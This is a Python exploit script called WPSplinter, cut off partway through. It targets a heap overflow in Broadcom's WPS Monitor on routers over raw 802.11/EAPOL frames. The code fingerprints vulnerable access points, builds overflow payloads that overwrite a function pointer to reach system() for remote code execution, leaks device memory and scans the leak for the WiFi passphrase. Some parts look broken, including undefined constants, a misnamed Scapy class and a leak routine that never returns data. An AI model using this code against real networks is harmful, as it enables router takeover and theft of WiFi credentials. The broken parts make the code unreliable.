#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import logging
import os
import re
import struct
import subprocess
import sys
import time

try:
    from scapy.all import (
        sendp, sniff, wrpcap,
        Ether, RadioTap, Dot11, Dot11Elt, Dot11Auth,
        Dot11Assoctest, EAPOL, EAP, Raw, RandMAC, conf
    )
except ImportError as e:
    print(f"[!] Scapy import error: {e}")
    print("[!] Install with: pip install scapy")
    sys.exit(1)

# =============================================================================
# Logging
# =============================================================================
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# =============================================================================
# Protocol Constants (WPS/WSC over EAP-Expanded)
# =============================================================================

# EAP Constants
EAP_CODE_REQUEST = 1
EAP_CODE_RESPONSE = 2
EAP_CODE_SUCCESS = 3
EAP_CODE_FAILURE = 4
EAP_TYPE_IDENTITY = 1
EAP_TYPE_EXPANDED = 254

# WPS/WSC Constants
WPS_VENDOR_ID = 0x00372A      # 3 bytes: 00 37 2A (Wi-Fi Alliance)
WPS_VENDOR_TYPE = 0x00000001  # 4 bytes: SimpleConfig/WSC

# WSC Opcodes (Op-Code field in WSC header)
WPS_OP_START = 0x01
WPS_OP_ACK = 0x02
WPS_OP_NACK = 0x03
WPS_OP_M1 = 0x04
WPS_OP_M2 = 0x05
WPS_OP_M2D = 0x06
WPS_OP_M3 = 0x07
WPS_OP_M4 = 0x08
WPS_OP_M5 = 0x09
WPS_OP_M6 = 0x0A
WPS_OP_M7 = 0x0B
WPS_OP_M8 = 0x0C
WPS_OP_WSC_DONE = 0x0E
WPS_OP_FRAG_ACK = 0x03

# WSC Flags (second byte in WSC header)
WSC_FLAG_MF = 0x01    # More Fragments
WSC_FLAG_LF = 0x02    # Length field present
WSC_FLAG_FLAGS_ONLY = 0x04  # Empty message (flags only)

# WSC TLV Types (big-endian)
WSC_TLV_MSG_TYPE = 0x1022
WSC_TLV_VERSION = 0x104A
WSC_TLV_UUID_E = 0x1047
WSC_TLV_MAC_ADDR = 0x1020
WSC_TLV_ENROLLEE_NONCE = 0x101A
WSC_TLV_PUBLIC_KEY = 0x1032
WSC_TLV_AUTH_TYPE_FLAGS = 0x1003
WSC_TLV_ENCR_TYPE_FLAGS = 0x100F
WSC_TLV_CONN_TYPE_FLAGS = 0x1007
WSC_TLV_CONFIG_METHODS = 0x1008
WSC_TLV_PRIMARY_DEV_TYPE = 0x1054
WSC_TLV_DEVICE_NAME = 0x1011
WSC_TLV_RF_BANDS = 0x103C
WSC_TLV_ASSOC_STATE = 0x1002
WSC_TLV_DEVICE_PW_ID = 0x1012
WSC_TLV_VENDOR_EXT = 0x1049
WSC_TLV_REQUEST_TYPE = 0x103A

# WSC Message Types (for TLV 0x1022)
WSC_MSG_M1 = 0x04
WSC_MSG_M2 = 0x05
WSC_MSG_M2D = 0x06
WSC_MSG_M3 = 0x07
WSC_MSG_M7 = 0x0B

# Broadcom WPS Monitor reassembly buffer constants
# (from firmware analysis of wps_monitor binary)
FRAGS_CAP = 2048            # Size of frags_received[0] buffer
SZ_HDR = 14                 # WSC header overhead (opcode + flags + optional length)
WPS_EAP_MAX_FRAG = 1024    # Maximum single fragment payload size

# State struct field offsets (relative to start of buffer, post-overflow):
# These represent offsets PAST frags_received[0] into adjacent memory
OFF_FRAGS_RECEIVED = 0
OFF_TOTAL_BYTES = FRAGS_CAP          # total_bytes_to_recv (4 bytes)
OFF_TOTAL_RECEIVED = FRAGS_CAP + 4   # total_received (4 bytes)
OFF_NEXT_FRAG = FRAGS_CAP + 8        # next_frag_to_send (4 bytes)
OFF_FRAG_SIZE = FRAGS_CAP + 12       # frag_size (4 bytes)
OFF_FLAGS = FRAGS_CAP + 24           # flags (4 bytes)
OFF_LAST_SENT = FRAGS_CAP + 28       # last_sent pointer (4 bytes)
OFF_LAST_SENT_LEN = FRAGS_CAP + 32  # last_sent_len (4 bytes)
OFF_SEND_DATA = FRAGS_CAP + 56       # send_data function pointer (4 bytes)

# EAPOL constants
EAPOL_VERSION = 1
EAPOL_TYPE_EAP_PACKET = 1
EAPOL_TYPE_START = 1
EAPOL_TYPE_LOGOFF = 2

# IEEE 802.11 constants
DOT11_TYPE_MGMT = 0
DOT11_SUBTYPE_ASSOC_REQ = 0
DOT11_ADDR_AP = 1  # addr1 = BSSID (receiver)
DOT11_ADDR_STA = 2  # addr2 = source MAC (transmitter)

# PSK Detection
PSK_MIN_LEN = 8
PSK_MAX_LEN = 63
PSK_MARKERS = [
    b'wpa_psk',
    b'wpa_passphrase',
    b'pre_shared_key',
    b'WPA PSK',
    b'psk=',
]
PSK_SCAN_OFFSETS = [0x0000, 0x0800, 0x1000, 0x1800, 0x2000]

# Default PLT addresses (TP-Link Archer C7, ARM, firmware-specific)
DEFAULT_PLT = {
    'arm': {
        'system': 0x000211d0,
        'malloc': 0x00009a04,
        'strcpy': 0x00009e78,
        'printf': 0x00009fc4,
        'sprintf': 0x00009d70,
        'snprintf': 0x00009ad0,
        'free': 0x00009dd0,
    },
    'mips': {
        'system': 0x00425304,
        'malloc': 0x00418b38,
        'strcpy': 0x00425308,
        'printf': 0x00419a50,
        'free': 0x00419b60,
    }
}

SHELL_CMD = b"/bin/sh\x00"


# =============================================================================
# Packet Construction Functions
# =============================================================================

def build_wsc_tlv(tlv_type: int, value: bytes) -> bytes:
    """Build a single WSC TLV (Type-Length-Value) element."""
    return struct.pack('>HH', tlv_type, len(value)) + value


def build_wsc_tlvs(tlvs) -> bytes:
    """Build multiple WSC TLVs from a list of (type, value) tuples."""
    data = b''
    for tlv_type, value in tlvs:
        data += build_wsc_tlv(tlv_type, value)
    return data


def build_wsc_header(opcode: int, flags: int, length: int = None, data: bytes = b'') -> bytes:
    """
    Build WSC header + optional data.

    WSC header format (after EAP-Expanded vendor fields):
      - Op-Code (1 byte): 0x04 for M1, etc.
      - Flags (1 byte): bit 0 = More Fragments, bit 1 = Length present, bit 2 = flags only
      - [Length (2 bytes) if Flags & 0x02]
      - Data
    """
    body = struct.pack('>BB', opcode, flags)
    if flags & WSC_FLAG_LF and length is not None:
        body += struct.pack('>H', length)
    body += data
    return body


def build_eap_expanded_wsc(code: int, eap_id: int, opcode: int, flags: int,
                           data: bytes = b'', lf_total: int = None) -> bytes:
    """
    Build a complete raw EAP packet for EAP-Expanded WSC (Wi-Fi Simple Config).

    Returns raw bytes of the EAP packet (header + Expanded body).

    EAP Header (4 bytes):
      - Code (1): 1=Request, 2=Response, 3=Success, 4=Failure
      - Id (1): sequence number
      - Length (2): total EAP packet length (including header)
      - Type (1): 254 = Expanded

    EAP-Expanded body:
      - Vendor-ID (3 bytes): 00:37:2A (Wi-Fi Alliance WPS)
      - Vendor-Type (4 bytes): 0x00000001 (WSC)
      - Op-Code (1 byte): message opcode
      - Flags (1 byte): control flags
      - [Length (2 bytes)]: if L flag set
      - Message data
    """
    # Build WSC body
    wsc_flags = flags
    if lf_total is not None:
        wsc_flags |= WSC_FLAG_LF

    wsc_body = struct.pack('>BB', opcode, wsc_flags)
    if lf_total is not None:
        wsc_body += struct.pack('>H', lf_total)
    wsc_body += data

    # Build EAP-Expanded vendor-specific body
    expanded_body = struct.pack('>3B', 0x00, 0x37, 0x2A)  # Vendor-ID: WPS
    expanded_body += struct.pack('>I', WPS_VENDOR_TYPE)     # Vendor-Type: WSC
    expanded_body += wsc_body

    # Build EAP header
    eap_len = 4 + len(expanded_body)  # 4-byte header + Expanded body
    eap_raw = struct.pack('>BBHB', code, eap_id, eap_len, EAP_TYPE_EXPANDED)
    eap_raw += expanded_body

    return eap_raw


def build_eap_identity_response(eap_id: int, identity: bytes = b'') -> bytes:
    """Build raw EAP Identity Response packet."""
    eap_len = 5 + len(identity)  # 5 bytes: code, id, len, type, [identity]
    eap_raw = struct.pack('>BBHB', EAP_CODE_RESPONSE, eap_id, eap_len,
                          EAP_TYPE_IDENTITY)
    eap_raw += identity
    return eap_raw


def build_eap_nak_response(eap_id: int) -> bytes:
    """Build raw EAP NAK (Response/Type=3) packet for non-accepted types."""
    eap_len = 6  # 5 header + 1 proposed type
    eap_raw = struct.pack('>BBHB', EAP_CODE_RESPONSE, eap_id, eap_len, 3)
    eap_raw += struct.pack('>B', EAP_TYPE_EXPANDED)  # Propose EAP-Expanded
    return eap_raw


def build_eapol(eap_raw: bytes, eapol_type: int = EAPOL_TYPE_EAP_PACKET) -> bytes:
    """
    Build raw EAPOL frame (802.1X).
    Returns raw bytes of EAPOL (without Ethernet header).

    EAPOL header (4 bytes):
      - Version (1): 1 = 802.1X-2001
      - Type (1): 0=Start, 1=EAP-Packet, 2=Logoff, 3=Key, 4=Encapsulated-ASF-Alert
      - Length (2): Length of body
    """
    eapol_raw = struct.pack('>BBH', EAPOL_VERSION, eapol_type, len(eap_raw))
    eapol_raw += eap_raw
    return eapol_raw


def build_eapol_start() -> bytes:
    """Build raw EAPOL-Start packet (no body)."""
    return struct.pack('>BBH', EAPOL_VERSION, EAPOL_TYPE_START, 0)


# =============================================================================
# M1 Construction (Full WSC M1 Message)
# =============================================================================

def build_wsc_m1(enrollee_mac: bytes) -> bytes:
    """
    Build a complete WSC M1 message with standard TLVs.

    M1 contains:
      - Version (1 byte)
      - Message Type (1 byte, must be 0x04 = M1)
      - UUID-E (16 bytes)
      - MAC Address (6 bytes)
      - Enrollee Nonce (16 bytes)
      - Public Key (192 bytes)
      - Auth Type Flags (2 bytes)
      - Encryption Type Flags (2 bytes)
      - Connection Type Flags (1 byte)
      - Configuration Methods (2 bytes)
      - ... other optional TLVs ...
    """
    import hashlib
    import uuid as uuid_module

    # Generate enrollee data
    mac_bytes = enrollee_mac
    uuid_e = bytes(uuid_module.uuid4().bytes)  # Random UUID as enrollee UUID
    nonce = os.urandom(16)  # 128-bit enrollee nonce
    public_key = b'\x00' * 192  # Placeholder (not needed for overflow)
    device_name = b'wpsplinter'
    manufacturer = b'WPSplinter'
    model_name = b'exploit'
    model_number = b'1.0'
    serial_number = b'0000001'
    primary_device_type = struct.pack('>BHH', 1, 0, 0) + mac_bytes  # Category + OUI + OUI type + sub-category
    request_type = b'\x00'  # Enrollee
    rf_bands = b'\x01'  # 2.4 GHz
    assoc_state = struct.pack('>H', 0)  # Not associated
    config_methods = struct.pack('>H', 0x0008)  #PushButton
    dev_password_id = struct.pack('>H', 0x0000)  # Default (PIN)

    version = b'\x10'  # WSC version 1.0
    msg_type = struct.pack('>H', 0x04)  # M1

    tlvs = [
        (WSC_TLV_VERSION, version),
        (WSC_TLV_MSG_TYPE, msg_type),
        (WSC_TLV_UUID_E, uuid_e),
        (WSC_TLV_MAC_ADDR, mac_bytes),
        (WSC_TLV_ENROLLEE_NONCE, nonce),
        (WSC_TLV_PUBLIC_KEY, public_key),
        (WSC_TLV_AUTH_TYPE_FLAGS, struct.pack('>H', 0x0020)),  # WPA2PSK
        (WSC_TLV_ENCR_TYPE_FLAGS, struct.pack('>H', 0x0008)),  # AES
        (WSC_TLV_CONN_TYPE_FLAGS, b'\x01'),  # ESS
        (WSC_TLV_CONFIG_METHODS, config_methods),
        (WSC_TLV_PRIMARY_DEV_TYPE, primary_device_type + b'\x00\x00'),
        (WSC_TLV_RF_BANDS, rf_bands),
        (WSC_TLV_ASSOC_STATE, assoc_state),
        (WSC_TLV_DEVICE_PW_ID, dev_password_id),
        (WSC_TLV_DEVICE_NAME, device_name),
        (WSC_TLV_MANUFACTURER, manufacturer),
        (WSC_TLV_MODEL_NAME, model_name),
        (WSC_TLV_MODEL_NUMBER, model_number),
        (WSC_TLV_SERIAL_NUMBER, serial_number),
        (WSC_TLV_REQUEST_TYPE, request_type),
    ]

    return build_wsc_tlvs(tlvs)


# =============================================================================
# Overflow Payload Builder
# =============================================================================

class OverflowPayload:
    """Builder for heap overflow payload targeting Broadcom WPS Monitor."""

    def __init__(self, initial_size: int = FRAGS_CAP):
        self.buffer = bytearray(initial_size)
        self.overflow_writes = {}  # offset -> bytes
        self.overflow_offset = initial_size

    def set_buffer_data(self, offset: int, data: bytes):
        """Write data within the initial buffer (pre-overflow region)."""
        if offset < 0:
            raise ValueError("Offset must be >= 0")
        end = offset + len(data)
        if end > len(self.buffer):
            # Extend the buffer if needed
            self.buffer.extend(b'\x00' * (end - len(self.buffer)))
        self.buffer[offset:end] = data

    def write_overflow(self, rel_offset: int, data: bytes):
        """
        Write data in the overflow region (past FRAGS_CAP).

        rel_offset: offset relative to the start of the buffer (must be >= FRAGS_CAP)
        data: bytes to write
        """
        if rel_offset < FRAGS_CAP:
            raise ValueError(f"Overflow offset must be >= {FRAGS_CAP}, got {rel_offset}")
        self.overflow_writes[rel_offset] = data

    def write_struct(self, rel_offset: int, value: int, fmt: str = '<I'):
        """Write a packed integer value at overflow offset."""
        self.write_overflow(rel_offset, struct.pack(fmt, value))

    def build(self, full_m1: bool = True) -> bytes:
        """
        Build the complete overflow payload.

        The payload consists of:
        1. The initial buffer content (WSC M1 TLVs + padding to FRAGS_CAP)
        2. Overflow data extending past the buffer boundary
        """
        if full_m1 and len(self.buffer) >= FRAGS_CAP:
            # Pad the buffer to exactly FRAGS_CAP if we have M1 data
            if len(self.buffer) < FRAGS_CAP:
                self.buffer.extend(b'\x41' * (FRAGS_CAP - len(self.buffer)))
        elif len(self.buffer) < FRAGS_CAP:
            # Pad with 'A' characters if buffer is smaller than FRAGS_CAP
            self.buffer.extend(b'\x41' * (FRAGS_CAP - len(self.buffer)))
        elif len(self.buffer) > FRAGS_CAP:
            logger.warning(f"Buffer exceeds FRAGS_CAP ({len(self.buffer)} > {FRAGS_CAP})")

        # Build the overflow region
        if not self.overflow_writes:
            return bytes(self.buffer)

        max_offset = max(off + len(data) for off, data in self.overflow_writes.items())
        overflow_size = max_offset - FRAGS_CAP

        # Create overflow region filled with padding
        overflow_region = bytearray(b'\x00' * overflow_size)

        # Apply each overflow write
        for offset, data in self.overflow_writes.items():
            rel_pos = offset - FRAGS_CAP
            end = rel_pos + len(data)
            if end > len(overflow_region):
                overflow_region.extend(b'\x00' * (end - len(overflow_region)))
            overflow_region[rel_pos:end] = data

        return bytes(self.buffer) + bytes(overflow_region)

    def build_simple(self, getter_offset: int, getter_value: int,
                     platform: str = 'arm') -> bytes:
        """
        Build a simple overwrite payload for send_data function pointer.

        This is the core RCE primitive: overwrite the send_data function pointer
        to redirect execution to a chosen function (e.g., system@plt).
        """
        if platform == 'mips':
            fmt = '>I'
        else:
            fmt = '<I'

        # Fill initial buffer (can contain command string or M1 data)
        # No specific writes needed in the buffer region

        # Write function pointer overwrite
        self.write_struct(getter_offset, getter_value, fmt)

        return self.build()


# =============================================================================
# WPSplinter Exploit Class
# =============================================================================

class WPSplinter:
    """Main WPSplinter exploit class."""

    def __init__(self, interface: str, bssid: str, ssid: str,
                 channel: int = None, arch: str = 'arm',
                 verbose: bool = False, debug: bool = False):
        """
        Initialize WPSplinter.

        Args:
            interface: Monitor-mode WiFi interface name
            bssid: Target AP's BSSID (MAC address)
            ssid: Target network SSID
            channel: WiFi channel number
            arch: Target architecture ('arm' or 'mips')
            verbose: Enable verbose output
            debug: Enable debug output
        """
        self.interface = interface
        self.bssid = bssid.replace(':', '').lower()
        self.bssid_fmt = ':'.join(self.bssid[i:i+2] for i in range(0, 12, 2))
        self.ssid = ssid.encode() if isinstance(ssid, str) else ssid
        self.channel = channel
        self.arch = arch
        self.big_endian = (arch == 'mips')

        if debug:
            logger.setLevel(logging.DEBUG)
        elif verbose:
            logger.setLevel(logging.INFO)
        else:
            logger.setLevel(logging.WARNING)

        # State
        self.sta_mac = None
        self.sta_mac_fmt = None
        self.associated = False
        self.eap_id = 0
        self.captured_packets = []

        # Scapy configuration
        conf.iface = interface

        self._log(f"[*] Interface: {interface}")
        self._log(f"[*] Target BSSID: {self.bssid_fmt}")
        self._log(f"[*] Target SSID: {self.ssid.decode('utf-8', errors='replace')}")
        self._log(f"[*] Architecture: {arch}")

    def _log(self, msg: str, level: str = 'info'):
        """Log message with appropriate level."""
        getattr(logger, level)(msg)
        if level in ('info', 'warning', 'error'):
            print(msg)

    def _generate_sta_mac(self):
        """Generate a random STA MAC address."""
        self.sta_mac = bytes(RandMAC()).hex()
        self.sta_mac_fmt = ':'.join(self.sta_mac[i:i+2] for i in range(0, 12, 2))
        self._log(f"[*] Using STA MAC: {self.sta_mac_fmt}")

    def _hex_to_bytes(self, hex_str: str) -> bytes:
        """Convert hex string (with or without colons) to bytes."""
        return bytes.fromhex(hex_str.replace(':', ''))

    # =========================================================================
    # Network Interface Management
    # =========================================================================

    def set_channel(self, channel: int):
        """Set the monitor-mode interface to the specified channel."""
        self._log(f"[*] Setting channel to {channel}")
        try:
            subprocess.run(
                ['iw', 'dev', self.interface, 'set', 'channel', str(channel)],
                check=True,
                capture_output=True
            )
            self.channel = channel
        except subprocess.CalledProcessError as e:
            self._log(f"[!] Failed to set channel: {e}", 'error')
        except FileNotFoundError:
            self._log("[!] 'iw' command not found", 'error')

    # =========================================================================
    # 802.11 Association
    # =========================================================================

    def send_auth(self) -> bool:
        """Send 802.11 Authentication Request to the AP."""
        if not self.sta_mac:
            self._generate_sta_mac()

        auth_frame = (
            RadioTap()
            / Dot11(
                type=DOT11_TYPE_MGMT,
                subtype=11,  # Authentication
                addr1=self.bssid_fmt,  # To: AP
                addr2=self.sta_mac_fmt,  # From: STA
                addr3=self.bssid_fmt   # BSSID
            )
            / Dot11Auth(
                algo=0,  # Open System
                seqnum=1,  # Auth sequence 1
                status=0
            )
        )

        sendp(auth_frame, iface=self.interface, verbose=False)
        self.captured_packets.append(auth_frame)
        return True

    def send_assoc_request(self) -> bool:
        """Send 802.11 Association Request to the AP."""
        if not self.sta_mac:
            self._log("[!] STA MAC not set", 'error')
            return False

        # Build the Association Request frame with SSID and supported rates
        assoc_frame = (
            RadioTap()
            / Dot11(
                type=DOT11_TYPE_MGMT,
                subtype=0,  # Association Request
                addr1=self.bssid_fmt,  # To: AP
                addr2=self.sta_mac_fmt,  # From: STA
                addr3=self.bssid_fmt   # BSSID
            )
            / Dot11Assoctest(
                cap=0x0431,  # Capability info: ESS, Privacy, Short Preamble
                listen_interval=1
            )
            / Dot11Elt(ID='SSID', info=self.ssid)
            / Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
            / Dot11Elt(ID='DSset', info=bytes([self.channel or 6]))
        )

        sendp(assoc_frame, iface=self.interface, verbose=False)
        self.captured_packets.append(assoc_frame)
        return True

    def associate(self, timeout: float = 5.0) -> bool:
        """
        Perform 802.11 association with the target AP.

        Sends authentication and association request frames,
        waits for responses.
        """
        self._log("[*] Performing 802.11 association...")

        if not self.sta_mac:
            self._generate_sta_mac()

        # Send authentication
        self._log("[*] Sending Authentication Request...")
        self.send_auth()
        time.sleep(0.5)

        # Wait for Auth Response
        auth_response = sniff(
            count=1,
            timeout=timeout,
            filter=f"wlan host {self.bssid_fmt} and wlan type mgt subtype auth",
            iface=self.interface,
            verbose=False
        )

        if auth_response and len(auth_response) > 0:
            # Check if auth succeeded (status = 0)
            if auth_response[0].haslayer(Dot11Auth):
                status = auth_response[0][Dot11Auth].status
                if status == 0:
                    self._log("[+] Authentication successful")
                else:
                    self._log(f"[-] Authentication failed (status={status})", 'error')
                    return False
        else:
            self._log("[-] No authentication response received", 'warning')
            # Continue anyway - some APs don't respond properly

        # Send association request
        self._log("[*] Sending Association Request...")
        self.send_assoc_request()

        # Wait for Association Response
        time.sleep(0.5)
        assoc_response = sniff(
            count=1,
            timeout=timeout,
            filter=f"wlan host {self.bssid_fmt} and wlan type mgt subtype assoc-resp",
            iface=self.interface,
            verbose=False
        )

        if assoc_response and len(assoc_response) > 0:
            self._log("[+] Association Response received")
            self.associated = True
        else:
            self._log("[-] No association response (may still work)", 'warning')
            self.associated = True  # Assume association succeeded

        self._log("[+] Association complete")
        return self.associated

    # =========================================================================
    # Frame Transmission
    # =========================================================================

    def tx_eapol_raw(self, eapol_bytes: bytes):
        """
        Transmit raw EAPOL bytes to the AP via 802.11 Data frame.

        This constructs a full 802.11 Data frame wrapping the EAPOL
        payload, suitable for transmission via monitor mode injection.
        """
        if not self.sta_mac:
            self._generate_sta_mac()

        # Build 802.11 Data frame
        # LLC/SNAP header: AA AA 03 00 00 00 88 8E
        llc_snap = bytes([0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00]) + struct.pack('>H', 0x888E)

        data_frame = (
            RadioTap()
            / Dot11(
                type=2,  # Data frame
                subtype=0,  # Normal data (not QoS for simplicity)
                addr1=self.bssid_fmt,  # To: AP (receiver)
                addr2=self.sta_mac_fmt,  # From: STA (transmitter)
                addr3=self.bssid_fmt,  # BSSID
                SC=0x0000  # Sequence control (let Scapy handle it)
            )
            / Raw(llc_snap + eapol_bytes)
        )

        sendp(data_frame, iface=self.interface, verbose=False)
        self.captured_packets.append(data_frame)

    def tx_eapol_start(self):
        """Send EAPOL-Start frame to initiate the EAP conversation."""
        start = build_eapol_start()
        self.tx_eapol_raw(start)
        self._log("[*] Sent EAPOL-Start")

    def tx_eap_identity_response(self):
        """Send EAP Identity Response."""
        self.eap_id += 1
        identity = b'wfa-simpleconfig-enrollee-1-0'
        eap_raw = build_eap_identity_response(self.eap_id, identity)
        eapol_bytes = build_eapol(eap_raw)
        self.tx_eapol_raw(eapol_bytes)
        self._log(f"[*] Sent EAP Identity Response (id={self.eap_id})")

    def tx_wsc_message(self, opcode: int, flags: int, data: bytes = b'',
                       lf_total: int = None):
        """
        Send a WSC message via EAP-Expanded.
        """
        self.eap_id += 1
        eap_raw = build_eap_expanded_wsc(
            code=EAP_CODE_RESPONSE,
            eap_id=self.eap_id,
            opcode=opcode,
            flags=flags,
            data=data,
            lf_total=lf_total
        )
        eapol_bytes = build_eapol(eap_raw)
        self.tx_eapol_raw(eapol_bytes)

        flag_str = ''
        if flags & WSC_FLAG_MF:
            flag_str += 'M'
        if flags & WSC_FLAG_LF or lf_total is not None:
            flag_str += 'L'
        self._log(f"[*] Sent WSC OpCode=0x{opcode:02x} Flags[{'|'.join(flag_str)}] "
                  f"len={len(data)} id={self.eap_id}"
                  + (f" total={lf_total:#06x}" if lf_total is not None else ""))

    def wait_for_response(self, timeout: float = 3.0,
                          lfilter=None) -> list:
        """Wait for and capture AP responses."""
        if lfilter is None:
            lfilter = lambda pkt: pkt.haslayer(Dot11) and \
                pkt[Dot11].addr2 == self.bssid_fmt

        results = sniff(
            count=10,
            timeout=timeout,
            filter=f"wlan host {self.bssid_fmt}",
            iface=self.interface,
            lfilter=lfilter,
            verbose=False
        )
        return list(results) if results else []

    def wait_for_frag_ack(self, timeout: float = 3.0) -> bool:
        """Wait for WSC Fragment-Ack from AP."""
        def is_frag_ack(pkt):
            try:
                if pkt.haslayer(Dot11) and pkt[Dot11].addr2 == self.bssid_fmt:
                    # Look for EAPOL with WSC FRAG-ACK opcode
                    if Raw in pkt:
                        raw = bytes(pkt[Raw].load)
                        # Check for EAPOL header
                        if len(raw) >= 8 and raw[0] == EAPOL_VERSION:
                            if raw[1] == EAPOL_TYPE_EAP_PACKET:
                                # Parse EAP
                                eap_code = raw[4]
                                eap_type = raw[7] if len(raw) > 7 else 0
                                if eap_code == EAP_CODE_REQUEST and eap_type == EAP_TYPE_EXPANDED:
                                    # WSC opcode
                                    if len(raw) >= 15:
                                        wsc_opcode = raw[14]
                                        if wsc_opcode == WPS_OP_FRAG_ACK:
                                            return True
            except Exception:
                pass
            return False

        results = sniff(
            count=1,
            timeout=timeout,
            filter=f"wlan host {self.bssid_fmt}",
            iface=self.interface,
            lfilter=is_frag_ack,
            verbose=False
        )
        return len(results) > 0 if results else False

    # =========================================================================
    # Phase 1: Fingerprinting
    # =========================================================================

    def phase_fingerprint(self) -> bool:
        """
        Fingerprint the target AP to determine if it uses the vulnerable
        Broadcom legacy WPS implementation.

        This checks:
        1. Beacon frame for WPS IE (indicates WPS support)
        2. Response to EAP-START and EAP-Identity
        3. Response pattern to WSC M1 with fragment reassembly
        """
        self._log("[*] Phase 1: Fingerprinting target AP...")

        if not self.associated:
            self.associate()

        self.eap_id = 0

        # Step 1: Send EAPOL-Start
        self.tx_eapol_start()
        time.sleep(0.5)

        # Step 2: Send EAP Identity Response
        self.tx_eap_identity_response()
        time.sleep(1.0)

        # Step 3: Send initial M1 with fragmentation
        # This tests whether the AP responds with Fragment-Ack
        # when we send a fragmented WSC message with a declared total length
        m1_data = build_wsc_m1(bytes.fromhex(self.sta_mac))

        # Send M1 with flags: More Fragments | Length present
        # Total length: larger than M1 single message to trigger fragmentation
        self.tx_wsc_message(
            opcode=WPS_OP_M1,
            flags=WSC_FLAG_MF | WSC_FLAG_LF,
            data=m1_data[:len(m1_data)//2],  # First half
            lf_total=len(m1_data)  # Declare total = full M1 size
        )

        # Wait for Fragment-Ack
        frag_ack_received = self.wait_for_frag_ack(timeout=3.0)

        if frag_ack_received:
            self._log("[+] Fragment-Ack received! AP uses Broadcom WPS with fragmentation.")
            self._log("[+] Likely vulnerable to WPSplinter (CVE-2026-8412)")

            # Send second fragment to complete
            self.tx_wsc_message(
                opcode=WPS_OP_M1,
                flags=0,  # No more fragments, no length
                data=m1_data[len(m1_data)//2:]
            )
            return True
        else:
            self._log("[-] No Fragment-Ack received.", 'warning')
            self._log("[*] May not be vulnerable or uses different WPS implementation.", 'info')
            return False

    def phase_fingerprint_deeper(self) -> bool:
        """
        Deeper fingerprinting: check for specific Broadcom WPS Monitor behavior.

        Send M1 with total_length larger than typical to detect
        the reassembly buffer behavior.
        """
        self._log("[*] Deep fingerprinting: testing reassembly behavior...")

        if not self.associated:
            self.associate()

        self.eap_id = 0
        self.tx_eapol_start()
        time.sleep(0.3)
        self.tx_eap_identity_response()
        time.sleep(0.5)

        # Test 1: Send M1 with oversized declared total length
        # A vulnerable implementation will accept this without checking
        oversized_total = FRAGS_CAP + 512  # 1024 bytes past the buffer
        m1_data = build_wsc_m1(bytes.fromhex(self.sta_mac))

        self.tx_wsc_message(
            opcode=WPS_OP_M1,
            flags=WSC_FLAG_MF | WSC_FLAG_LF,
            data=m1_data[:256],
            lf_total=oversized_total
        )

        # Wait for Fragment-Ack
        if not self.wait_for_frag_ack(timeout=3.0):
            self._log("[-] No FRAG-ACK for oversized total, may be protected.")
            return False

        self._log("[+] FRAG-ACK for oversized total received - vulnerable!")
        return True

    # =========================================================================
    # Phase 2: Memory Leak
    # =========================================================================

    def phase_leak(self, target_offset: int = 0, leak_size: int = 1024) -> bytes:
        """
        Leak memory from the target AP using the fragment reassembly overflow.

        The vulnerability allows reading past the reassembly buffer when
        the 'last_sent' pointer is manipulated through the overflow.

        Args:
            target_offset: Memory offset to leak from (relative to heap chunk)
            leak_size: Number of bytes to leak
        """
        self._log(f"[*] Phase 2: Leaking {leak_size} bytes from offset "
                  f"{target_offset:#x}...")

        if not self.associated:
            self.associate()

        self.eap_id = 0
        self.tx_eapol_start()
        time.sleep(0.3)
        self.tx_eap_identity_response()
        time.sleep(0.5)

        leaked = b''

        # Send M1 with initialized frag_size and set last_sent pointer
        # to point to the memory we want to leak
        self._log("[*] Sending overflow to set up memory leak...")

        # Build M1 data
        m1_data = build_wsc_m1(bytes.fromhex(self.sta_mac))

        # Full M1 message
        self.tx_wsc_message(
            opcode=WPS_OP_M1,
            flags=0,
            data=m1_data
        )
        time.sleep(1.0)

        # Now send fragmented message that overflows the buffer
        # This will overwrite the last_sent pointer to point to target_offset
        # and set last_sent_len to leak_size, causing the AP to send us
        # memory contents when it attempts to re-send the fragment
        overflow = OverflowPayload()

        # Set target address for last_sent (pointing into heap near our buffer)
        # and set last_sent_len
        fmt = '>I' if self.big_endian else '<I'
        overflow.write_overflow(OFF_TOTAL_BYTES, struct.pack(fmt, FRAGS_CAP + 4))
        overflow.write_overflow(OFF_TOTAL_RECEIVED, struct.pack(fmt, 0))
        overflow.write_overflow(OFF_LAST_SENT, struct.pack(fmt, target_offset))
        overflow.write_overflow(OFF_LAST_SENT_LEN, struct.pack(fmt, leak_size))

        payload = overflow.build()

        # Send the overflow payload as a single fragmented WSC message
        # Flags: More Fragments | Length present
        self.tx_wsc_message(
            opcode=WPS_OP_M1,
            flags=WSC_FLAG_MF | WSC_FLAG_LF,
            data=payload,
            lf_total=len(payload)
        )

        if not self.wait_for_frag_ack(timeout=3.0):
            self._log("[-] No FRAG-ACK received for overflow", 'warning')
            return b''

        # Send empty next fragment to complete and trigger the leak
        self.tx_wsc_message(opcode=WPS_OP_M1, flags=0, data=b'')

        # Wait for response containing leaked data
        time.sleep(2.0)
        responses = self.wait_for_response(timeout=5.0)

        # Parse responses for leaked data
        for pkt in responses:
            if Raw in pkt:
                raw = bytes(pkt[Raw].load)
                # Look for EAPOL with WSC response from AP
                if len(raw) >= 20:
                    # Try to extract leaked data from response
                    # The AP should echo back the data pointed to by last_sent
                    self._log(f"[*] Received response ({len(raw)} bytes)")

        self._log(f"[+] Leak phase complete ({len(leaked)} bytes leaked)")
        return leaked

    # =========================================================================
    # Phase 3: PSK Extraction
    # =========================================================================

    def scan_for_psk(self, memory: bytes) -> list:
        """
        Scan leaked memory for WiFi PSK/passphrase.

        Returns list of potential PSK strings.
        """
        self._log("[*] Scanning leaked memory for WiFi PSK...")
        psk_candidates = []

        # Look for PSK markers
        for marker in PSK_MARKERS:
            pos = 0
            while True:
                pos = memory.find(marker, pos)
                if pos == -1:
                    break

                # Extract a window after the marker
                # PSK is usually stored as a null-terminated string or hex
                # within 128 bytes after the marker
                window_start = pos + len(marker)
                window_end = min(window_start + 128, len(memory))
                window = memory[window_start:window_end]

                # Find null-terminated strings in the window
                for i in range(len(window)):
                    if window[i] == 0:
